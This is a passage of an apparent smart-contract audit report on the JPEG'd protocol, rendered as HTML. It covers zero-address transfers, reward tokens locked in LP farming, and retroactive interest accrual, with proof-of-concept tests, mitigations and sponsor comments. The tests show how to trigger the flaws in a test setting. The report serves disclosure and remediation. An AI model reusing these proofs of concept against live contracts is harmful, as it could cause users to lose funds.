class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;forge-std/Vm.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// contracts</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;../test/CryptoPunks.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;../helpers/CryptoPunksHelper.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract CryptoPunksHelperTest is DSTest {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Vm constant vm = Vm(HEVM_ADDRESS);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address owner = address(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address user = address(2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    CryptoPunks private cps;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    CryptoPunksHelper private helper;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function setUp() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(owner);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        cps = new CryptoPunks();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        helper = new CryptoPunksHelper();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        helper.initialize(address(cps));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function testOwnerTransferToZero() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //make sure address zero hold no punks</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(cps.balanceOf(address(0)), 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // safeTransferFrom PoC</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(owner);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        cps.getPunk(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        cps.transferPunk(address(helper), 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        helper.safeTransferFrom(owner, address(0), 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(cps.punkIndexToAddress(1), address(0));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(helper.ownerOf(1), address(0));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(cps.balanceOf(address(0)), 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // transferFrom PoC</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        cps.getPunk(2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        cps.transferPunk(address(helper), 2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        helper.transferFrom(owner, address(0), 2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(cps.punkIndexToAddress(2), address(0));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(helper.ownerOf(2), address(0));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(cps.balanceOf(address(0)), 2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>foundry.toml</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">[default]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">src = &quot;contracts&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">libs = [&quot;lib/forge-std/lib&quot;, &quot;lib/&quot;, &quot;node_modules&quot;]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">solc_version = &quot;0.8.0&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">optimizer = false</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">fuzz_runs = 100000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">test = &quot;foundryTest&quot;</span></span></code></pre>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<ul>\n<li>Foundry</li>\n<li>Hardhat</li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Even the functions are restricted for only the owner, the zero address should not be allowed as the receiver address.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/47#issuecomment-1095518421\">spaghettieth (JPEG’d) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>The sole purpose of <code>CryptoPunksHelper.sol</code> and <code>EtherRocksHelper.sol</code> contracts is to allow compatibility of non ERC721 NFTs to be compatible with <code>NFTVault.sol</code> without having to modify the vault’s code. They don’t have to provide any additional security check outside of compatibility related ones, everything else is out of scope and should be handled by the underlying NFT.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-03-reward-will-be-locked-in-the-farm-if-no-lp-join-the-pool-at-epochstartblock-\" style=\"position:relative;\"><a href=\"#m-03-reward-will-be-locked-in-the-farm-if-no-lp-join-the-pool-at-epochstartblock-\" aria-label=\"m 03 reward will be locked in the farm if no lp join the pool at epochstartblock  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/14\">[M-03] reward will be locked in the farm if no LP join the pool at epoch.startBlock </a></h2>\n<p><em>Submitted by TrungOre</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L214\">LPFarming.sol#L214</a><br>\n<a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L107\">LPFarming.sol#L107</a><br></p>\n<p>A part of reward tokens will be locked in the farming pool if no user deposits lpToken at the epoch.startBlock.</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">it(&quot;a part of reward should be locked in farm if no LP join the pool at epoch.startBlock&quot;, async() =&gt; {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // manual mine new block  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await network.provider.send(&quot;evm_setAutomine&quot;, [false]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // prepare </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await lpTokens[0].transfer(alice.address, units(1000));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await lpTokens[0].connect(alice).approve(farming.address, units(1000));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await mineBlocks(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // create new pool</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await farming.add(10, lpTokens[0].address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await mineBlocks(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(await farming.poolLength()).to.equal(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let pool = await farming.poolInfo(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(pool.lpToken).to.equal(lpTokens[0].address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(pool.allocPoint).to.equal(10);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // create new epoch ==&gt; balance of pool will be 1000 </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let blockNumber = await ethers.provider.getBlockNumber();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await farming.newEpoch(blockNumber + 1, blockNumber + 11, 100);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // skip the epoch.startBlock  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // it mean no one deposit lpToken to farm at this block </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await mineBlocks(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(await jpeg.balanceOf(farming.address)).to.equal(1000);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // alice deposit </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await farming.connect(alice).deposit(0, units(100));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await mineBlocks(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // skip the blocks to the end of epoch </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await mineBlocks(13);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await farming.connect(alice).claim(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await mineBlocks(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      console.log(&quot;reward of alice: &quot;, (await jpeg.balanceOf(alice.address)).toString());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      console.log(&quot;reward remain: &quot;, await jpeg.balanceOf(farming.address));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // 100 jpeg will be locked in the pool forevers </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(await jpeg.balanceOf(alice.address)).to.equal(900);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(await jpeg.balanceOf(farming.address)).to.equal(100);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }); </span></span></code></pre>\n<p>In the example above, I create an epoch from blockNumber + 1 to blockNumber + 11 with the reward for each block being 100JPEG. So, the total reward for this farm will be 1000JPEG. When I skip the epoch.startBlock and let Alice deposit 100 lpToken at the block right after, at the end of the farm (epoch.endBlock), the total reward of Alice is just 900JPEG, and 100JPEG still remains in the farming pool. Since there is no function for the admin (or users) to withdraw the remaining, 100JPEG will be stucked in the pool forever !!!</p>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>typescript</p>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add a new function for the admin (or user) to claim all rewards which remained in the pool when epoch.endTime has passed</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function claimRemainRewardsForOwner() external onlyOwner {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            block.number &gt; epoch.endBlock, </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            &#39;epoch has not ended&#39;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 remain = jpeg.balanceOf(address(this));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        jpeg.safeTransfer(msg.sender, remain);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/14#issuecomment-1095301767\">spaghettieth (JPEG’d) acknowledged, but disagreed with Medium severity and commented</a>:</strong></p>\n<blockquote>\n<p>This is a very minor issue, severity should be 0.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/14#issuecomment-1109977048\">LSDan (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I disagree with the sponsor. Funds are lost in this scenario and it is very easy to mitigate.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-04-setdebtinterestapr-should-accrue-debt-first\" style=\"position:relative;\"><a href=\"#m-04-setdebtinterestapr-should-accrue-debt-first\" aria-label=\"m 04 setdebtinterestapr should accrue debt first permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/78\">[M-04] <code>setDebtInterestApr</code> should accrue debt first</a></h2>\n<p><em>Submitted by cmichel, also found by pedroais</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L212\">NFTVault.sol#L212</a><br></p>\n<p>The <code>setDebtInterestApr</code> changes the debt interest rate without first accruing the debt.<br>\nThis means that the new debt interest rate is applied retroactively to the unaccrued period on next <code>accrue()</code> call.</p>\n<p>It should never be applied retroactively to a previous time window as this is unfair &#x26; wrong.<br>\nBorrowers can incur more debt than they should.</p>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Call <code>accrue()</code> first in <code>setDebtInterestApr</code> before setting the new <code>settings.debtInterestApr</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/78\">spaghettieth (JPEG’d) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/78#issuecomment-1099241122\">spaghettieth (JPEG’d) resolved and commented</a>:</strong></p>\n<blockquote>\n<p>Fixed in <a href=\"https://github.com/jpegd/core/pull/4\">jpegd/core#4</a>.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-05-rewards-will-be-locked-if-user-transfer-directly-to-pool-without-using-deposit-function-\" style=\"position:relative;\"><a href=\"#m-05-rewards-will-be-locked-if-user-transfer-directly-to-pool-without-using-deposit-function-\" aria-label=\"m 05 rewards will be locked if user transfer directly to pool without using deposit function  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/19\">[M-05] Rewards will be locked if user transfer directly to pool without using deposit function </a></h2>\n<p><em>Submitted by TrungOre</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L190\">LPFarming.sol#L190</a><br></p>\n<p>Reward will be locked in the farming, when user execute a direct transfer with lpToken to farm without using deposit.</p>\n<h3 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>“pls add this test to LpFarming.ts to check”</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">it(&quot;a part of rewards can&#39;t be distributed if user execute a direct transfer to farm&quot;, async() =&gt; {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // manual mine new block  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await network.provider.send(&quot;evm_setAutomine&quot;, [false]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // prepare </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      const attacker = bob;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await lpTokens[0].transfer(alice.address, units(1000));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await lpTokens[0].transfer(attacker.address, units(1000));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await lpTokens[0].connect(alice).approve(farming.address, units(1000));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await mineBlocks(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // attacker direct deposit lp token to the pool </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await lpTokens[0].connect(attacker).transfer(farming.address, units(100));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // create new pool</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await farming.add(10, lpTokens[0].address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await mineBlocks(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(await farming.poolLength()).to.equal(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let pool = await farming.poolInfo(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(pool.lpToken).to.equal(lpTokens[0].address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(pool.allocPoint).to.equal(10);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // create new epoch ==&gt; balance of pool will be 1000 </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let blockNumber = await ethers.provider.getBlockNumber();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await farming.newEpoch(blockNumber + 1, blockNumber + 11, 100);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // alice deposit </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await farming.connect(alice).deposit(0, units(100));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await mineBlocks(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(await jpeg.balanceOf(farming.address)).to.equal(1000);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // when pool end, alice can just take 500 jpeg, and 500 jpeg will be locked in the contract forever !!!</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await mineBlocks(13);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      console.log(&quot;reward of alice: &quot;, (await   farming.pendingReward(0, alice.address)).toString());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(await farming.pendingReward(0, alice.address)).to.equal(BigNumber.from(&#39;500&#39;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span></code></pre>\n<p>In the test above, the attacker transfers 100 lpToken to the farm without using deposit function, and alice deposit 100 lpToken. Because the contract uses <code>pool.lpToken.balanceOf(address(this))</code> to get the total supply of lpToken in the pool, it will sum up 100 lpToken of attacker and 100 lpToken of alice. This will lead to the situation where Alice will only be able to claim 500 token (at epoch.endBlock), the rest will be locked in the pool forever. Not only with this pool, it also affects the following, a part of the reward will be locked in the pool when the farm end.</p>\n<h3 id=\"tools-used-3\" style=\"position:relative;\"><a href=\"#tools-used-3\" aria-label=\"tools used 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 